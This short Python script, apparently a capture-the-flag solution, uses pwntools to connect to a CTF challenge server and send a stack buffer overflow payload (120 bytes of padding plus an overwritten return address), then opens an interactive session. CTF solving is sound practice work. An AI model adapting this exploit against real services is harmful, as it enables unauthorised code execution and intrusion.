import pwn
from struct import pack


# r = pwn.elf.ELF("./main").process()

with pwn.remote('01.linux.challenges.ctf.thefewchosen.com', 52049) as r:
    payload = b'A'*120+pack("<Q", 0x4011bb)

    p = r.recvuntil(b'\n')
    p = r.sendline(payload)
    r.interactive()